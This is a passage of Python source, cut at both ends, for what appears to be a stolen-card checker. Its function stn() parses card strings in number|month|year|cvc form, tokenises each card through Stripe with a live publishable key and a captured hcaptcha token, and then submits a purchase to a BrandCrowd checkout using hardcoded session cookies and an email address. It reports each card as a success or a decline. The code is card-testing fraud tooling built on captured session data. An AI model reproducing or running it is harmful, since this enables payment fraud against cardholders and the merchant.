QikHH5OPSZmfANUW6GU8874On6Qp0vEJFOUoDL94SQyVtCArBWJuvqD3dhB6HtIu8f2INQ9MSD3hgpNKjbJ172Pqq01EB5RuXiqCJAXUXIkYi1a6K9GgEWRXq-uHZ-9lE0oTzVimYM002QQWezoF_hFWqbowasQcp_8W6',
	    'ab.storage.userId.10402dcf-98a1-474c-92da-ec52a09a8616': '%7B%22g%22%3A%2239a7fd30-d222-418a-bfd1-1d6618a66987%22%2C%22c%22%3A1715832234405%2C%22l%22%3A1715832234405%7D',
	    '__stripe_mid': '8235a651-2067-492a-9a35-e7eb1863e2c4c9ae54',
	    '_gcl_au': '1.1.1204692422.1715832241',
	    '_ga': 'GA1.1.1542255616.1715832242',
	    '_fbp': 'fb.1.1715832242582.1432169573',
	    '_tt_enable_cookie': '1',
	    '_ttp': 'BPXdM3jII8Ha5tePvZzAaP8r5sO',
	    'brandcrowd-user-session-id': '5b01b3b0-4dcf-bf57-f2c2-b308af000a3c',
	    'bc_s': 'CfDJ8IvzqFzHTtFGoh34l%2B99SRbG5eA35O5x2hhLOXtP2UbzZYJJOhfUttYNBI5Ch03Tg3CgxaOMpgyRRT0nSlpi75%2Fr%2FT5l%2FIDDMpa5zzEodNuJku6ozMMa%2BLXVNV6ifgskIlT2q2vOZPH2mqu2ObF51hMtEkWWC0LKzn%2FS1kF0otzP',
	    'ab.storage.sessionId.10402dcf-98a1-474c-92da-ec52a09a8616': '%7B%22g%22%3A%22e7d76a1a-78e4-7faa-cf2a-3aa0d60d44c3%22%2C%22e%22%3A1715961640890%2C%22c%22%3A1715959840895%2C%22l%22%3A1715959840895%7D',
	    'mp_878a43cbe7b74f3d409d4392b3c63831_mixpanel': '%7B%22distinct_id%22%3A%20%22%24device%3A18f7f9227abda3-02ec169f878bb7-b457550-46500-18f7f9227afda7%22%2C%22%24device_id%22%3A%20%2218f7f9227abda3-02ec169f878bb7-b457550-46500-18f7f9227afda7%22%2C%22%24initial_referrer%22%3A%20%22%24direct%22%2C%22%24initial_referring_domain%22%3A%20%22%24direct%22%2C%22utm_source%22%3A%20null%2C%22utm_medium%22%3A%20null%2C%22utm_campaign%22%3A%20null%2C%22utm_content%22%3A%20null%2C%22utm_term%22%3A%20null%7D',
	    '.AspNetCore.Antiforgery.TcmPAuy1nOM': 'CfDJ8IvzqFzHTtFGoh34l-99SRbEwYfUT7toqE-1-OyjriQn8yvjPhVNqvSroUVsI5NXFZM0Ukz-BAN-fSYJM3VVH0Ta3muBALlhmMBrhf_E3xUs4m77feAQ7GJ8ty5Xzlp_aJELnwLTRBKnIOffpHGUZ9Q',
	    '__stripe_sid': 'bcfeeb0e-51b5-4eb5-a37b-840b0d0b9024b7c8be',
	    '_uetsid': '7180d090146211ef89aded17c728abeb',
	    '_uetvid': '86617bc0d01d11ee9148db38439bde60',
	    '_ga_FFRLYW6TZ1': 'GS1.1.1715959850.2.1.1715959851.59.0.0',
	    'brandcrowd-search': 'DefaultSearchV4',
	    'bc-gt-2469-local-pricing-lower-wtp': 'gt-2469-variation-1',
	    'bc-gt-4683-three-package-pricing': 'gt-4683-disabled',
	    'bc-gt-2728-2-year-subs': 'gt-2728-disabled',
	    'brandcrowd-price-context': '25OFFSEM',
	    'bc-gt-4692-free-logos-2024': 'gt-4692-excluded',
	    'bc-gt-5041-cookie-consent-alternatives': 'gt-5041-excluded',
	    'bc-gt-5292-auth-copy-validity': 'gt-5292-variation-1',
	}
	
	headers = {
	    'authority': 'www.brandcrowd.com',
	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'accept-language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar-AE;q=0.7,ar;q=0.6',
	    'cache-control': 'max-age=0',
	    'content-type': 'application/x-www-form-urlencoded',
	    # 'cookie': 'bc_a=CfDJ8IvzqFzHTtFGoh34l-99SRY7oWAc10G-K7k3nMjvLFN8oK57yIunkGFVP0EpjjPiRMuDpJyfQxYW8ne1v-JawlnOw5ypoAk_0Okr6Uae_vGyf0xRLDpU93LW_JSCQZxzKlMbXa69th4VAdFfwh2rQ7fCSsD_N8WNwd4b5-ewbpyL83kvUcc5FWMY99XPngmYzCzejcUZl7uMb2OiBcShftgiTQ6FebGT5buB9-krcy1-MCRuqiARpcbIYfZyjYEPbJc5goAH930FXL6R6GU1CbS61pvYtRtXaEeTrNFjqhnOCgG4U7SOU1lVdAmga0-RCaulTfCPcca3KoJNzodwka82PddM7yldUO6K-WDNbGY3skD9Wz0VqXy1tJFydmG7RfQX9pYCaN6b9-3eUZIKP0t8bR969OjAI7K0Ir2Eo8qTXpXAT6KLdbmERxOK2xdXyfKM6M_aoQoo5Uq4GRuCzkobILoXUuAp4Pq5cSv0666an1zJQH8QqZ_AmVI8IRs6Ze3E8i55fJkMl1hOPs2Yiq0xsEUnrCHXJk7i_eZFd1kxNjg7KcZIpT8R9nu5SiirRU9_EkdXrKBNRofDZY8ECxBe-vsbyWJLMDM3BDkKv10yD5FLLmnOUAN-f9e6yEoMmm_-liKfANQRr8edtEbyZrvjy1bsZyz43ZRbqGcNUFliC9p6wswGotlXlZeGviekuCQvAG0ml6UlvCiyUmbWMxFTkZTCTuB5PaOkxlzxSJqOs2AREASo7xgIbfMB_ql43VtZIVwKwF0r0R06s-w9l6hGKXyorj4cywwSTMyhCpr2JSpdv0xbdSS5R4PtXGa46d0mWMZlrIa94PFt8rJ1cyNSlnnvQcXWcSYx3PdnLua8eVUCaU3cuC_rCafjvjNmSsdYkJjSpUqQ2qjF43edUenueGZ6jSInRNqYn4CEis_Y15uXBEelgYOCXfDbJnT0hHAjMKeAN8cZS0rzc_Mg7GA8oWbPFMAcZoe3AIn-jYeELhakFDLNVNZeZEprKhs0Kq5Zh6EqxGPdYmavUkVwuAcE28ZEDNEEysQaPk1b8f7DjfoBdGAdo41zf5pqcJ92WwOoe2jQ7v1Z82935BwaM78lnDsbKkluIk0bgm5qoFFYJi71mErwnq2YHDiJso5kEhtJCFKquzmlhL1YvTs1evwP3fPtyIA_06hz45I-AXnqbLtKHEHDn_oeT9_rVt6SeAhUfiXQF2hJaZWU9iuOCNh1he_f6br7UHJGTtXmUCcgn5yj0Ri7Y-i8dAzZyKL8kEOVeBiBnwGKo36OEopPb5jTo77elMMJwA-1-Wh7dTr-uQg4Vct-MrfgQA_XdpkfqLhLuQFIN2laGmpU_vJOhPrW7J2GptUAEMSqh8JYO6pn_eo9etBBkRK0ZyA9lHcrNj981dyQikHH5OPSZmfANUW6GU8874On6Qp0vEJFOUoDL94SQyVtCArBWJuvqD3dhB6HtIu8f2INQ9MSD3hgpNKjbJ172Pqq01EB5RuXiqCJAXUXIkYi1a6K9GgEWRXq-uHZ-9lE0oTzVimYM002QQWezoF_hFWqbowasQcp_8W6; ab.storage.userId.10402dcf-98a1-474c-92da-ec52a09a8616=%7B%22g%22%3A%2239a7fd30-d222-418a-bfd1-1d6618a66987%22%2C%22c%22%3A1715832234405%2C%22l%22%3A1715832234405%7D; __stripe_mid=8235a651-2067-492a-9a35-e7eb1863e2c4c9ae54; _gcl_au=1.1.1204692422.1715832241; _ga=GA1.1.1542255616.1715832242; _fbp=fb.1.1715832242582.1432169573; _tt_enable_cookie=1; _ttp=BPXdM3jII8Ha5tePvZzAaP8r5sO; brandcrowd-user-session-id=5b01b3b0-4dcf-bf57-f2c2-b308af000a3c; bc_s=CfDJ8IvzqFzHTtFGoh34l%2B99SRbG5eA35O5x2hhLOXtP2UbzZYJJOhfUttYNBI5Ch03Tg3CgxaOMpgyRRT0nSlpi75%2Fr%2FT5l%2FIDDMpa5zzEodNuJku6ozMMa%2BLXVNV6ifgskIlT2q2vOZPH2mqu2ObF51hMtEkWWC0LKzn%2FS1kF0otzP; ab.storage.sessionId.10402dcf-98a1-474c-92da-ec52a09a8616=%7B%22g%22%3A%22e7d76a1a-78e4-7faa-cf2a-3aa0d60d44c3%22%2C%22e%22%3A1715961640890%2C%22c%22%3A1715959840895%2C%22l%22%3A1715959840895%7D; mp_878a43cbe7b74f3d409d4392b3c63831_mixpanel=%7B%22distinct_id%22%3A%20%22%24device%3A18f7f9227abda3-02ec169f878bb7-b457550-46500-18f7f9227afda7%22%2C%22%24device_id%22%3A%20%2218f7f9227abda3-02ec169f878bb7-b457550-46500-18f7f9227afda7%22%2C%22%24initial_referrer%22%3A%20%22%24direct%22%2C%22%24initial_referring_domain%22%3A%20%22%24direct%22%2C%22utm_source%22%3A%20null%2C%22utm_medium%22%3A%20null%2C%22utm_campaign%22%3A%20null%2C%22utm_content%22%3A%20null%2C%22utm_term%22%3A%20null%7D; .AspNetCore.Antiforgery.TcmPAuy1nOM=CfDJ8IvzqFzHTtFGoh34l-99SRbEwYfUT7toqE-1-OyjriQn8yvjPhVNqvSroUVsI5NXFZM0Ukz-BAN-fSYJM3VVH0Ta3muBALlhmMBrhf_E3xUs4m77feAQ7GJ8ty5Xzlp_aJELnwLTRBKnIOffpHGUZ9Q; __stripe_sid=bcfeeb0e-51b5-4eb5-a37b-840b0d0b9024b7c8be; _uetsid=7180d090146211ef89aded17c728abeb; _uetvid=86617bc0d01d11ee9148db38439bde60; _ga_FFRLYW6TZ1=GS1.1.1715959850.2.1.1715959851.59.0.0; brandcrowd-search=DefaultSearchV4; bc-gt-2469-local-pricing-lower-wtp=gt-2469-variation-1; bc-gt-4683-three-package-pricing=gt-4683-disabled; bc-gt-2728-2-year-subs=gt-2728-disabled; brandcrowd-price-context=25OFFSEM; bc-gt-4692-free-logos-2024=gt-4692-excluded; bc-gt-5041-cookie-consent-alternatives=gt-5041-excluded; bc-gt-5292-auth-copy-validity=gt-5292-variation-1',
	    'origin': 'https://www.brandcrowd.com',
	    'referer': 'https://www.brandcrowd.com/checkout/77b446d1-833b-4e33-9b56-71fe5ce24348',
	    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'document',
	    'sec-fetch-mode': 'navigate',
	    'sec-fetch-site': 'same-origin',
	    'sec-fetch-user': '?1',
	    'upgrade-insecure-requests': '1',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
	}
	
	data = {
	    'CartToken': '77b446d1-833b-4e33-9b56-71fe5ce24348',
	    'IsPaymentRequired': 'true',
	    'PayerToken': id,
	    'WalletType': '',
	    'SelectedDiscountCode': '',
	    'SelectedTaxId': '',
	    'PurchaseInstructions': '',
	    'IsFreeTrial': 'false',
	    'UserEmail': 'markkeep72@gmail.com',
	    'ShippingAddress.Name': '',
	    'ShippingAddress.Street1': '',
	    'ShippingAddress.Street2': '',
	    'ShippingAddress.City': '',
	    'ShippingAddress.State': '',
	    'ShippingAddress.ZipCode': '',
	    'ShippingAddress.Country': '',
	    'ShippingAddress.Id': '0',
	    'ShippingAddress.IsPrimary': 'true',
	    'PayerTokenType': 'stripe',
	}
	
	response = requests.post(
	    'https://www.brandcrowd.com/maker/checkout/77b446d1-833b-4e33-9b56-71fe5ce24348',
	    cookies=cookies,
	    headers=headers,
	    data=data,
	)
	last=(response.text)
	soup = BeautifulSoup(last, 'html.parser')	
	if not 'tight">Error</p><' in last:
		if 'success' in last or 'Thank' in last or 'Subscribed' in last:
			return 'success'
	else:
		result = soup.find('p', class_='tw-text-base tw-text-white tw-m-0 tw-leading-tight tw-mb-2 lg:tw-mb-0')
		if result:
			return(result.text)
		else:
			return '#Your card has been declined'
def stn(card):
	import re
	card = card.strip()
	parts = re.split('[|]', card)
	n = parts[0]
	mm = parts[1]
	yy = parts[2]
	cvc = parts[3]
	if "20" in yy:
		yy = yy.split("20")[1]
	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar-AE;q=0.7,ar;q=0.6',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
	}
	
	data = f'key=pk_live_Lk2wcr8WKXEORwr4he3GSzEL&guid=4b356589-cfc9-4ce3-bacd-87a9aabfab2d607329&muid=8235a651-2067-492a-9a35-e7eb1863e2c4c9ae54&sid=bcfeeb0e-51b5-4eb5-a37b-840b0d0b9024b7c8be&referrer=https%3A%2F%2Fwww.brandcrowd.com&time_on_page=27978&card[number]={n}&card[exp_month]=08&card[exp_year]={yy}&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.hadwYXNza2V5xQYgOMResgdR8tVVFNz6ArhL0badnemc-IY332cxC2_RT129Rh1Ikfuyk36zFF-RySxke4a6eMVJlA_mD3GG9XWg_Dl9gxH8Duvd8AY2m8220XCcXDUTbgn8MNZQHYJTilwd60ePnVrY2hr0giMBzsyC-PFzl6PU9dGKMpDqCj4ZWszY8Hnp9s_RTTCCRow2HhjlZH7142PDQE2DkXrjQrVwniIiPa9DcpisxgRF4KXCm--kPhVyUnPklBhitoJyxL2QJw-S4oqX0YlPre18Tpmghricsh-jahZfnlc9Su1KTEipIolqrMnYsqza3dOkELAhC_61JYbAZGlaIOb87A7XbUd8LfszKYV-bFZhD1QO58NXyTH0pP_NPAZZJT2Ay7JMStWSCbxI-ze9_B8FX9BFtXKs5U5M1V7gmiqwjT9QCKInMuAWCR0lh-7kR0PtQyJGd4SRUAUylFbAJT92o70X1ssx_TPS6hLqYdvt6pWD82XpLCR49PzcdNjTFs-XBBO2_BwISfx3vVujrSPg7KhZw9kgvA22J91us5MkTlSBk0apP7_NFSe5mnAmJ2R_woIXdlm6ANTXaI7VZiXqUjL3ospqU0sVjYNunzzuhZgE1PsLtzvTb7mAVN3Ypi8v4tA6YG7q8bgNHg8LEIuWVoJ7smmGmW4wVs_c7vt-0PyP-tTzEhcYYB8n_oja2tb1yUJCkLgurWnqCa0IhmiT8eHEouA8uDi3bSGQOtsQ2hmcd0oqRv5dJ-phe37cWOxoWEyff5alVd6fGyhv2n79Qv47chzne9Hv5LPYJ4KYhE6wC2ntKbHgREEbe_Q9EAKgUqpmu6-tTx8uSSDEwTJh7_G_mr3QKHL-OXqRTJBOopsJTLvVZ4eucl_T2opGEgbybxT67YP-3YK0IY6xkHeDxbJydkocIrzffAhlIp3AwuHU-9NsMZdMT9N_DToGxwy3jT0wXIMAxXFS1sq7WkWWM20Nv4cFLReorGop597X-uZx-6jg8-x3YMmBBiATxKvLCdxLF_Rp2qi6yBwufT23hHtUabq0NmtN3P8ITO4sa-8e60XDHRslZ3u1r40ASSQxJvgksP47a79CybmonrJ-WFL10pK2LuvS1aa1ElYNBVBGoG_Cxk5xkgedIJTSUNlDAUxxWtx0IdrW0GwRTG83w1jZ6j49VXX0hLhy-h5IG0AN5Y1B14zvHkTtRwsTxuc1rz2i1IiqdsBY4qARNPXT33lyZwhpw_f4Er4AzY0gj9zVCT-nZeYBPCJfjk--fbyCQbuJ62DniQE7bFBwCzNKqW08F8wk4czJKLGJwvj6oJrcpIicWFp7r6uM3E3sQMM3caZCOMvYe0pl-D5bqRjmngHCjcIfKfuoCExUCD3WTZhCOWMmScpnf1Ko1CShzEa8N7QES0x-LQgh3694gK0WqEc4q7sOlXvbRTYBeWYizlV6v-waz5cBtwm03JrGPQnEWlQeKCA0Jti5dILqQL-kS9Q9V69vMsnuWcIbkWQ_EfkI4T3g5PatgwmIjIAyGSkJ6QA4N2rdUKIJaCG3lyxOMkqMgr4ePm6s11n6hX15ZKfg2Mrg0gBZC47x4hWNxcctyAEtJqMCriS61YeaYp6O9JYoxNQ80e3q7RNVZSWSmMtKGzG-UGjamhVEP5nsBhDvRhoG2g61OTWpz3K8jrOoiyVOU3nD79b-uY2j_EiKgG41_7rf8Hxz2l35TflgeFB0tKbQWgP9uKW3gGJh97DQ8qwpRPiHoq4DV96kR-DiHI5z1qKNQiyWyJe8VfhktzbSEqzYr1fddy2h6xZkNX-GxcjlKIBa_mEnbE62GHzTKcX6UjGOtCapBBsBhsiCJ2T2YngKTQ8_mFNCfiLYH5RJ2L4lkZeU9_jPFZYMFtYbLufTZXm6ceYeg3cwmqFR_UdozNym4MLdZFpkKcwD5CRkIUPZvQ-35DnSowx_LkFmYvp4-8JvKbMr_Lgj5obZm5Dq_HVvzElL4haUXJtMKqO9Z45THYsJULYX49r1-NBPJ6bvkQIA4x50kma6FscgAK7GMjVMRlCGzsC-HrN2U9F69eyqwaUKCKWM2rDzHhibyaKWAzSjZXhwzmZHeKioc2hhcmRfaWTOAzGDb6JrcqgzNDE3OWE4ZKJwZAA.uKPrI9DFPyAAy5YHaxw9ML99H7z9q6y_pFG2MRbJkJU&payment_user_agent=stripe.js%2F315906f414%3B+stripe-js-v3%2F315906f414%3B+split-card-element'
	
	response = requests.post('https://api.stripe.com/v1/tokens', headers=headers, data=data)
	try:
		id=response.json()['id']
	except:
		return(response.json()['error']['message'])
	cookies = {
	    'bc_a': 'CfDJ8IvzqFzHTtFGoh34l-99SRY7oWAc10G-K7k3nMjvLFN8oK57yIunkGFVP0EpjjPiRMuDpJyfQxYW8ne1v-JawlnOw5ypoAk_0Okr6Uae_vGyf0xRLDpU93LW_JSCQZxzKlMbXa69th4VAdFfwh2rQ7fCSsD_N8WNwd4b5-ewbpyL83kvUcc5FWMY99XPngmYzCzejcUZl7uMb2OiBcShftgiTQ6FebGT5buB9-krcy1-MCRuqiARpcbIYfZyjYEPbJc5goAH930FXL6R6GU1CbS61pvYtRtXaEeTrNFjqhnOCgG4U7SOU1lVdAmga0-RCaulTfCPcca3KoJNzodwka82PddM7yldUO6K-WDNbGY3skD9Wz0VqXy1tJFydmG7RfQX9pYCaN6b9-3eUZIKP0t8bR969OjAI7K0Ir2Eo8qTXpXAT6KLdbmERxOK2xdXyfKM6M_aoQoo5Uq4GRuCzkobILoXUuAp4Pq5cSv0666an1zJQH8QqZ_AmVI8IRs6Ze3E8i55fJkMl1hOPs2Yiq0xsEUnrCHXJk7i_eZFd1kxNjg7KcZIpT8R9nu5SiirRU9_EkdXrKBNRofDZY8ECxBe-vsbyWJLMDM3BDkKv10yD5FLLmnOUAN-f9e6yEoMmm_-liKfANQRr8edtEbyZrvjy1bsZyz43ZRbqGcNUFliC9p6wswGotlXlZeGviekuCQvAG0ml6UlvCiyUmbWMxFTkZTCTuB5PaOkxlzxSJqOs2AREASo7xgIbfMB_ql43VtZIVwKwF0r0R06s-w9l6hGKXyorj4cywwSTMyhCpr2JSpdv0xbdSS5R4PtXGa46d0mWMZlrIa94PFt8rJ1cyNSlnnvQcXWcSYx3PdnLua8eVUCaU3cuC_rCafjvjNmSsdYkJjSpUqQ2qjF43edUenueGZ6jSInRNqYn4CEis_Y15uXBEelgYOCXfDbJnT0hHAjMKeAN8cZS0rzc_Mg7GA8oWbPFMAcZoe3AIn-jYeELhakFDLNVNZeZEprKhs0Kq5Zh6EqxGPdYmavUkVwuAcE28ZEDNEEysQaPk1b8f7DjfoBdGAdo41zf5pqcJ92WwOoe2jQ7v1Z82935BwaM78lnDsbKkluIk0bgm5qoFFYJi71mErwnq2YHDiJso5kEhtJCFKquzmlhL1YvTs1evwP3fPtyIA_06hz45I-AXnqbLtKHEHDn_oeT9_rVt6SeAhUfiXQF2hJaZWU9iuOCNh1he_f6br7UHJGTtXmUCcgn5yj0Ri7Y-i8dAzZyKL8kEOVeBiBnwGKo36OEopPb5jTo77elMMJwA-1-Wh7dTr-uQg4Vct-MrfgQA_XdpkfqLhLuQFIN2laGmpU_vJOhPrW7J2GptUAEMSqh8JYO6pn_eo9etBBkRK0ZyA9lHcrNj981dyQikHH5OPSZmfANUW6GU8874On6Qp0vEJFOUoDL94SQyVtCArBWJuvqD3dhB6HtIu8f2INQ9MSD3hgpNKjbJ172Pqq01EB5RuXiqCJAXUXIkYi1a6K9GgEWRXq-uHZ-9lE0oTzVimYM002QQWezoF_hFWqbowasQcp_8W6',
	    'ab.storage.userId.10402dcf-98a1-474c-92da-ec52a09a8616': '%7B%22g%22%3A%2239a7fd30-d222-418a-bfd1-1d6618a66987%22%2C%22c%22%3A1715832234405%2C%22l%22%3A1715832234405%7D',
	    '__stripe_mid': '8235a651-2067-492a-9a35-e7eb1863e2c4c9ae54',
	    '_gcl_au': '1.1.1204692422.1715832241',
	    '_ga': 'GA1.1.1542255616.1715832242',
	    '_fbp': 'fb.1.1715832242582.1432169573',
	    '_tt_enable_cookie': '1',
	    '_ttp': 'BPXdM3jII8Ha5tePvZzAaP8r5sO',
	    'brandcrowd-user-session-id': '5b01b3b0-4dcf-bf57-f2c2-b308af000a3c',
	    'bc_s': 'CfDJ8IvzqFzHTtFGoh34l%2B99SRbG5eA35O5x2hhLOXtP2UbzZYJJOhfUttYNBI5Ch03Tg3CgxaOMpgyRRT0nSlpi75%2Fr%2FT5l%2FIDDMpa5zzEodNuJku6ozMMa%2BLXVNV6ifgskIlT2q2vOZPH2mqu2ObF51hMtEkWWC0LKzn%2FS1kF0otzP',
	    'ab.storage.sessionId.10402dcf-98a1-474c-92da-ec52a09a8616': '%7B%22g%22%3A%22e7d76a1a-78e4-7faa-cf2a-3aa0d60d44c3%22%2C%22e%22%3A1715961640890%2C%22c%22%3A1715959840895%2C%22l%22%3A1715959840895%7D',
	    'mp_878a43cbe7b74f3d409d4392b3c63831_mixpanel': '%7B%22distinct_id%22%3A%20%22%24device%3A18f7f9227abda3-02ec169f878bb7-b457550-46500-18f7f9227afda7%22%2C%22%24device_id%22%3A%20%2218f7f9227abda3-02ec169f878bb7-b457550-46500-18f7f9227afda7%22%2C%22%24initial_referrer%22%3A%20%22%24direct%22%2C%22%24initial_referring_domain%22%3A%20%22%24direct%22%2C%22utm_source%22%3A%20null%2C%22utm_medium%22%3A%20null%2C%22utm_campaign%22%3A%20null%2C%22utm_content%22%3A%20null%2C%22utm_term%22%3A%20null%7D',
	    '.AspNetCore.Antiforgery.TcmPAuy1nOM': 'CfDJ8IvzqFzHTtFGoh34l-99SRbEwYfUT7toqE-1-OyjriQn8yvjPhVNqvSroUVsI5NXFZM0Ukz-BAN-fSYJM3VVH0Ta3muBALlhmMBrhf_E3xUs4m77feAQ7GJ8ty5Xzlp_aJELnwLTRBKnIOffpHGUZ9Q',
	    '__stripe_sid': 'bcfeeb0e-51b5-4eb5-a37b-840b0d0b9024b7c8be',
	    '_uetsid': '7180d090146211ef89aded17c728abeb',
	    '_uetvid': '86617bc0d01d11ee9148db38439bde60',
	    '_ga_FFRLYW6TZ1': 'GS1.1.1715959850.2.1.1715959851.59.0.0',
	    'brandcrowd-search': 'DefaultSearchV4',
	    'bc-gt-2469-local-pricing-lower-wtp': 'gt-2469-variation-1',
	    'bc-gt-4683-three-package-pricing': 'gt-4683-disabled',
	    'bc-gt-2728-2-year-subs': 'gt-2728-disabled',
	    'brandcrowd-price-context': '25OFFSEM',
	    'bc-gt-4692-free-logos-2024': 'gt-4692-excluded',
	    'bc-gt-5041-cookie-consent-alternatives': 'gt-5041-excluded',
	    'bc-gt-5292-auth-copy-validity': 'gt-5292-variation-1',
	}
	
	headers = {
	    'authority': 'www.brandcrowd.com',
	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'accept-language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar-AE;q=0.7,ar;q=0.6',
	    'cache-control': 'max-age=0',
	    'content-type': 'application/x-www-form-urlencoded',
	    # 'cookie': 'bc_a=CfDJ8IvzqFzHTtFGoh34l-99SRY7oWAc10G-K7k3nMjvLFN8oK57yIunkGFVP0EpjjPiRMuDpJyfQxYW8ne1v-JawlnOw5ypoAk_0Okr6Uae_vGyf0xRLDpU93LW_JSCQZxzKlMbXa69th4VAdFfwh2rQ7fCSsD_N8WNwd4b5-ewbpyL83kvUcc5FWMY99XPngmYzCzejcUZl7uMb2OiBcShftgiTQ6FebGT5buB9-krcy1-MCRuqiARpcbIYfZyjYEPbJc5goAH930FXL6R6GU1CbS61pvYtRtXaEeTrNFjqhnOCgG4U7SOU1lVdAmga0-RCaulTfCPcca3KoJNzodwka82PddM7yldUO6K-WDNbGY3skD9Wz0VqXy1tJFydmG7RfQX9pYCaN6b9-3eUZIKP0t8bR969OjAI7K0Ir2Eo8qTXpXAT6KLdbmERxOK2xdXyfKM6M_aoQoo5Uq4GRuCzkobILoXUuAp4Pq5cSv0666an1zJQH8QqZ_AmVI8IRs6Ze3E8i55fJkMl1hOPs2Yiq0xsEUnrCHXJk7i_eZFd1kxNjg7KcZIpT8R9nu5SiirRU9_EkdXrKBNRofDZY8ECxBe-vsbyWJLMDM3BDkKv10yD5FLLmnOUAN-f9e6yEoMmm_-liKfANQRr8edtEbyZrvjy1bsZyz43ZRbqGcNUFliC9p6wswGotlXlZeGviekuCQvAG0ml6UlvCiyUmbWMxFTkZTCTuB5PaOkxlzxSJqOs2AREASo7xgIbfMB_ql43VtZIVwKwF0r0R06s-w9l6hGKXyorj4cywwSTMyhCpr2JSpdv0xbdSS5R4PtXGa46d0mWMZlrIa94PFt8rJ1cyNSlnnvQcXWcSYx3PdnLua8eVUCaU3cuC_rCafjvjNmSsdYkJjSpUqQ2qjF43edUenueGZ6jSInRNqYn4CEis_Y15uXBEelgYOCXfDbJnT0hHAjMKeAN8cZS0rzc_Mg7GA8oWbPFMAcZoe3AIn-jYeELhakFDLNVNZeZEprKhs0Kq5Zh6EqxGPdYmavUkVwuAcE28ZEDNEEysQaPk1b8f7DjfoBdGAdo41zf5pqcJ92WwOoe2jQ7v1Z82935BwaM78lnDsbKkluIk0bgm5qoFFYJi71mErwnq2YHDiJso5kEhtJCFKquzmlhL1YvTs1evwP3fPtyIA_06hz45I-AXnqbLtKHEHDn_oeT9_rVt6SeAhUfiXQF2hJaZWU9iuOCNh1he_f6br7UHJGTtXmUCcgn5yj0Ri7Y-i8dAzZyKL8kEOVeBiBnwGKo36OEopPb5jTo77elMMJwA-1-Wh7dTr-uQg4Vct-MrfgQA_XdpkfqLhLuQFIN2laGmpU_vJOhPrW7J2GptUAEMSqh8JYO6pn_eo9etBBkRK0ZyA9lHcrNj981dyQikHH5OPSZmfANUW6GU8874On6Qp0vEJFOUoDL94SQyVtCArBWJuvqD3dhB6HtIu8f2INQ9MSD3hgpNKjbJ172Pqq01EB5RuXiqCJAXUXIkYi1a6K9GgEWRXq-uHZ-9lE0oTzVimYM002QQWezoF_hFWqbowasQcp_8W6; ab.storage.userId.10402dcf-98a1-474c-92da-ec52a09a8616=%7B%22g%22%3A%2239a7fd30-d222-418a-bfd1-1d6618a66987%22%2C%22c%22%3A1715832234405%2C%22l%22%3A1715832234405%7D; __stripe_mid=8235a651-2067-492a-9a35-e7eb1863e2c4c9ae54; _gcl_au=1.1.1204692422.1715832241; _ga=GA1.1.1542255616.1715832242; _fbp=fb.1.1715832242582.1432169573; _tt_enable_cookie=1; _ttp=BPXdM3jII8Ha5tePvZzAaP8r5sO; brandcrowd-user-session-id=5b01b3b0-4dcf-bf57-f2c2-b308af000a3c; bc_s=CfDJ8IvzqFzHTtFGoh34l%2B99SRbG5eA35O5x2hhLOXtP2UbzZYJJOhfUttYNBI5Ch03Tg3CgxaOMpgyRRT0nSlpi75%2Fr%2FT5l%2FIDDMpa5zzEodNuJku6ozMMa%2BLXVNV6ifgskIlT2q2vOZPH2mqu2ObF51hMtEkWWC0LKzn%2FS1kF0otzP; ab.storage.sessionId.10402dcf-98a1-474c-92da-ec52a09a8616=%7B%22g%22%3A%22e7d76a1a-78e4-7faa-cf2a-3aa0d60d44c3%22%2C%22e%22%3A1715961640890%2C%22c%22%3A1715959840895%2C%22l%22%3A1715959840895%7D; mp_878a43cbe7b74f3d409d4392b3c63831_mixpanel=%7B%22distinct_id%22%3A%20%22%24device%3A18f7f9227abda3-02ec169f878bb7-b457550-46500-18f7f9227afda7%22%2C%22%24device_id%22%3A%20%2218f7f9227abda3-02ec169f878bb7-b457550-46500-18f7f9227afda7%22%2C%22%24initial_referrer%22%3A%20%22%24direct%22%2C%22%24initial_referring_domain%22%3A%20%22%24direct%22%2C%22utm_source%22%3A%20null%2C%22utm_medium%22%3A%20null%2C%22utm_campaign%22%3A%20null%2C%22utm_content%22%3A%20null%2C%22utm_term%22%3A%20null%7D; .AspNetCore.Antiforgery.TcmPAuy1nOM=CfDJ8IvzqFzHTtFGoh34l-99SRbEwYfUT7toqE-1-OyjriQn8yvjPhVNqvSroUVsI5NXFZM0Ukz-BAN-fSYJM3VVH0Ta3muBALlhmMBrhf_E3xUs4m77feAQ7GJ8ty5Xzlp_aJELnwLTRBKnIOffpHGUZ9Q; __stripe_sid=bcfeeb0e-51b5-4eb5-a37b-840b0d0b9024b7c8be; _uetsid=7180d090146211ef89aded17c728abeb; _uetvid=86617bc0d01d11ee9148db38439bde60; _ga_FFRLYW6TZ1=GS1.1.1715959850.2.1.1715959851.59.0.0; brandcrowd-search=DefaultSearchV4; bc-gt-2469-local-pricing-lower-wtp=gt-2469-variation-1; bc-gt-4683-three-package-pricing=gt-4683-disabled; bc-gt-2728-2-year-subs=gt-2728-disabled; brandcrowd-price-context=25OFFSEM; 